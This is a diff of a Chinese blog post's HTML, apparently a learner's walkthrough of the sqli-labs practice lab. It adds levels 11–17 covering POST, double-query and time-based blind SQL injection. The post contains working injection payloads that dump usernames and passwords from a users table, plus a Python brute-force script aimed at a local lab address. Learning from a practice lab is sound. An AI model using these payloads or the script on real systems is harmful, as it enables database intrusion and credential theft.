@@ -195,7 +195,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      2.9k 字
+      4.1k 字
     </span>
   
 
@@ -205,7 +205,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      34
+      49
        分钟
     </span>
   
@@ -258,7 +258,8 @@
 </ul>
 <hr>
 <h3 id="通关历程"><a href="#通关历程" class="headerlink" title="通关历程"></a>通关历程</h3><hr>
-<h3 id="1-4"><a href="#1-4" class="headerlink" title="1~4"></a>1~4</h3><ul>
+<h3 id="1-4"><a href="#1-4" class="headerlink" title="1~4"></a>1~4</h3><p>​        完成最简单的sql注入。</p>
+<ul>
 <li><p>输入单双引号，观察报错信息，构造命令使语句闭合</p>
 </li>
 <li><p>使用 order by 语句判断字段数，接着union select 1,2,…观察能显示的数据</p>
@@ -280,7 +281,7 @@
 <figure class="highlight n1ql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs n1ql">... union <span class="hljs-keyword">select</span>  <span class="hljs-number">1</span>,<span class="hljs-number">2</span>, group_concat(concat_ws(<span class="hljs-string">&#x27;~&#x27;</span>,<span class="hljs-keyword">password</span>,username)) <span class="hljs-keyword">from</span> security.users %<span class="hljs-number">23</span><br><br>//查询数据库security中uers表的列<span class="hljs-keyword">password</span>和username的所有字段并用‘~’隔开<br></code></pre></div></td></tr></table></figure></li>
 </ul>
 <hr>
-<h3 id="5-6"><a href="#5-6" class="headerlink" title="5~6"></a>5~6</h3><p>输入的正常查询语句不再显示有用的信息，但报错语句仍有提示。此时根据题目类型“double injection”采用双查询注入的方法</p>
+<h3 id="5-6"><a href="#5-6" class="headerlink" title="5~6"></a>5~6</h3><p>​        输入的正常查询语句不再显示有用的信息，但报错语句仍有提示。此时根据题目类型“double injection”采用双查询注入的方法</p>
 <blockquote>
 <p><em>若SQL语句正确，则页面正常返回，但返回的页面中不包含任何有用的信息，而当SQL语句错误时，页面会显示SQL错误信息。在这种情况下，Double Injection是十分有用的。</em>    <img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/20210529133753.png" srcset="/img/loading.gif" lazyload></p>
 <p>​                <em>———查询有关double injection的详细信息请点击这里<a target="_blank" rel="noopener" href="https://blog.werner.wiki/principle-of-double-injection-in-mysql/">Mysql中Double Injection原理浅析</a></em></p>
@@ -323,8 +324,8 @@
 <p>（正常的话应该会显示绿色的对话框提示链接成功的）</p>
 <p>因为是直接上传了木马，链接成功的话就能直接控制服务器了。sql注入这个文件上传的漏洞威胁显然是很大的，我感觉以后遇到的情况会很少。</p>
 <hr>
-<h3 id="8-10"><a href="#8-10" class="headerlink" title="8~10"></a>8~10</h3><p>这里开始接触盲注，（盲注：后台使用了一些方法屏蔽了把偶从信息，此时无法通过报错信息进行注入的判断）同时这也是最常见的sql注入。其中第8关是bool型，9、10关是时间型。</p>
-<p>盲注又大概分为布尔型和时间型。</p>
+<h3 id="8-10"><a href="#8-10" class="headerlink" title="8~10"></a>8~10</h3><p>​        这里开始接触盲注，（盲注：后台使用了一些方法屏蔽了把偶从信息，此时无法通过报错信息进行注入的判断）同时这也是最常见的sql注入。</p>
+<p>盲注又大概分为布尔型和时间型，其中第8关是布尔型，9、10关是时间型。</p>
 <p><strong>另外因为盲注会比较繁琐，所以有必要学会使用，编写脚本。</strong></p>
 <p>接下来我会从手注并配合python脚本的方式来完成。</p>
 <p>第8关：</p>
@@ -341,7 +342,7 @@
 
 <p>老实说到这里光靠手注我已经进行不下去了…上脚本。</p>
 <p>关于脚本的编写请见我这一篇文章，传送门：<a target="_blank" rel="noopener" href="https://eggswoo.com/2021/06/16/py-script-sql-injection/">用python编写一个sql注入脚本 - 蛋窝窝 (eggswoo.com)</a></p>
-<p>目前所写的脚本比较low，要完成注入需要不断代码，以后找时间升级。贴一下运行情况</p>
+<p>这个脚本比较low，但具备了完成该任务的基本功能，要完成其他注入则需要升级。</p>
 <p>payload:查找security.users中的password</p>
 <p>对应运行结果</p>
 <p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/20210620213416.png" srcset="/img/loading.gif" lazyload></p>
@@ -359,7 +360,49 @@
 <p>估计大佬也不会用手注这种方式来完成…</p>
 <p>最后贴上用脚本的截图</p>
 <p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/20210620224800.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="11-12"><a href="#11-12" class="headerlink" title="11~12"></a>11~12</h3><p>​        从这里开始由get类型的注入转变为post类型的注入。之前都是可以直接在浏览器地址栏进行的get类型的注入，而通常post传送的数据不能在url上看到，只能通过抓包工具(burpsuite)，浏览器插件（hackbar）进行查看。无论我们在他给出的登录框怎么输入，上面的url地址栏都不会产生变化。</p>
+<p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/0%5B%7DF%5BP%7BHGS9$L%60ZUP9G8S8B.png" srcset="/img/loading.gif" lazyload></p>
+<p>而在登录框中构造的语句仍然是有效的，因为我们输入的就是post所上传的数据。</p>
+<p>当我在username栏末尾输入‘时报错。从这个报错语句中即可以看出这里的sql语句是以单引号闭合的。</p>
+<p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/20210712214452.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里的username和password都是注入点，任选一个都可以使用语句注入。</p>
+<ul>
+<li><p>输入单双引号，观察报错信息，构造命令使语句闭合</p>
+</li>
+<li><p>使用 order by 语句判断字段数</p>
+</li>
+<li><p>构造语句查询数据库的信息</p>
+</li>
+</ul>
+<p>所有步骤和1~4关的都一样，只是注入方式由get变为post,我们输入的工具语句也由在url中输入变为在表单中输入。另外注入符用#而不是%23，因为我们输入的语句不再经过浏览器url解析了。</p>
+<p>12就是语句双引号加单小括号闭合，注入方法不变。</p>
 <hr>
+<h3 id="13-14"><a href="#13-14" class="headerlink" title="13-14"></a>13-14</h3><div class="hljs code-wrapper"><pre><code> 这两关名字叫做post类型的双重注入，输入的正常查询语句不再显示有用的信息，但报错语句仍有提示。通过报错信息闭合语句并查询完字段数后，根据前5~6关get类型的双重注入经验可先按照以往get类型的双重注入来尝试，果然成功了。
+</code></pre></div>
+<p>语句：</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs n1ql">`1&#x27;) union <span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(*),concat((<span class="hljs-keyword">select</span> concat_ws(<span class="hljs-string">&#x27;~&#x27;</span>,username,<span class="hljs-keyword">password</span>)<span class="hljs-keyword">from</span> security.users <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">14</span>)*<span class="hljs-number">2</span>))a <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a #<span class="hljs-symbol">`</span><br></code></pre></div></td></tr></table></figure>
+
+<p>对应结果</p>
+<p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/jhgfhj.png" srcset="/img/loading.gif" lazyload></p>
+<p>而第14关就是语句的闭合方式变为双引号，可按照同样的方式进行注入。</p>
+<hr>
+<h3 id="15-16"><a href="#15-16" class="headerlink" title="15~16"></a>15~16</h3><p>​        这两关是post类型的盲注。有了之前get类型中盲注的经验，这两关也就不那么复杂了。</p>
+<p> 此时的页面是不会提供一丁点信息的，语句正确与否只会弹出一张图片来告诉我们是否登录成功，而这个信息对我们来说是没用的，所以想到利用盲注的方法来进行注入。在尝试bool型盲注无效后目前唯一可利用的就是利用time类型的盲注。</p>
+<p>​    <em>我找了网上的许多教程，都是直接 用语句<code>admin&#39; and if(1,sleep(3),1) #</code>就确定了存在时间类型的盲注，但我没想明白为什么直接就用了一个正确的账号名称admin和and 语句链接。而我尝试了or语句语句好像是不起作用的</em></p>
+<p>​    完善了一下之前的脚本，顺利完成任务。贴一下脚本的主要代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#playload:</span><br><span class="hljs-comment"># select group_concat(schema_name) from information_schema.schemata</span><br><span class="hljs-comment"># select group_concat(table_name) from information_schema.tables where table_schema=&#x27;  &#x27;</span><br><span class="hljs-comment"># select group_concat(column_name) from information_schema.columns where table_schema=&#x27;  &#x27;and table_name=&#x27;  &#x27;</span><br><span class="hljs-comment"># select group_concat(concat_ws(&#x27;~&#x27;,password,username)) from security.users</span><br>dic = <span class="hljs-string">&#x27;&#x27;&#x27;abcdefghijklmnopqrstuvwxyz,_ 0123456789()~`!@#$%^&amp;*-=+[]&#123;&#125;;:&#x27;&quot;|\,&lt;.&gt;/?&#x27;&#x27;&#x27;</span><span class="hljs-comment">#基于这个字典循环爆破</span><br>string = <span class="hljs-string">&#x27;&#x27;</span><br>url = <span class="hljs-string">&quot;http://192.168.147.181/sqli-labs-master/Less-15/&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>)  <br>	<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> dic:<br>    	payload = <span class="hljs-string">&#x27;&#x27;&#x27;admin&quot;)and if(substr((select group_concat(concat_ws(&#x27;~&#x27;,password,username)) from security.users),&#123;&#125;,1)=&#123;&#125;,sleep(3),1)#&#x27;&#x27;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(i), <span class="hljs-built_in">ascii</span>(j))<br>        <span class="hljs-comment"># 针对不同题目修改payload与data</span><br>         data = &#123;<br>                <span class="hljs-string">&#x27;uname&#x27;</span>: payload,<br>                <span class="hljs-string">&#x27;passwd&#x27;</span>: <span class="hljs-string">&#x27;&amp;submit=Submit&#x27;</span><br>         &#125;<br>          <span class="hljs-comment"># print(data)</span><br>         response = requests.post(url, data=data)<br>         sec = response.elapsed.total_seconds()<br><br>         <span class="hljs-keyword">if</span> sec &gt; <span class="hljs-number">2</span>: <br>         	string += j<br>            <span class="hljs-built_in">print</span>(string)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(string)<br></code></pre></div></td></tr></table></figure>
+
+<p>爆破的部分结果图：</p>
+<p>有点奇怪为什么账号和密码用的是y来隔开，依照我用的语句应该是~隔开才对 </p>
+<p> <code>payload = &#39;&#39;&#39;admin&quot;)and if(substr((select group_concat(concat_ws(&#39;~&#39;,password,username)) from security.users),&#123;&#125;,1)=&#123;&#125;,sleep(3),1)#&#39;&#39;&#39;.format(int(i), ascii(j))</code></p>
+<p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/20210725152947.png" srcset="/img/loading.gif" lazyload></p>
+<hr>
+<h3 id="17"><a href="#17" class="headerlink" title="17"></a>17</h3><p><strong>去学查看源码</strong></p>
+<p>报错注入；</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43606134/article/details/106126537">(45条消息) sqli-labs-master第17关_m_ing-CSDN博客</a>；</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/AmoBlogs/p/8673748.html%EF%BC%9B">https://www.cnblogs.com/AmoBlogs/p/8673748.html；</a></p>
+<hr>
+<h3 id="18-19"><a href="#18-19" class="headerlink" title="18~19"></a>18~19</h3><hr>
 <h3 id="简单总结"><a href="#简单总结" class="headerlink" title="简单总结"></a>简单总结</h3><hr>
 <ul>
 <li>1~4  GET - Error base 类型，很直白的把信息都显示出来，没啥好说的。</li>
@@ -382,6 +425,13 @@
 </li>
 <li><p>9~10 GET - Blind - Time  Based 类型 掌握sleep函数，并要学会写脚本解决。</p>
 <p>盲注是最常见的sql注入类型，所以有必要仔细掌握。从这开始也就要学会写脚本工具了。</p>
+<p>盲注采取的工具语句并没什么变化，知识多了截取字符与字典比较的过程，这种爆破的思路很适合用脚本解决。</p>
+</li>
+<li><p>11~12 POST-Error Based 类型 接触到post类型的注入，最大的变化是不通过url地址栏，而是通过上传数据的表单进行注入攻击了，语句也不再通过浏览器url解析，#直接用就行。</p>
+</li>
+<li><p>13~14 POST-double  类型。方法同get。</p>
+</li>
+<li><p>15~16 POST-Blind 类型。（虽说关卡名字说是布尔注入，但我没找到语句正确与错误时返回页面的不同，可能需要抓包来看了）。同样用python脚本解决，对python的掌握程度要求并不高。</p>
 </li>
 </ul>
 
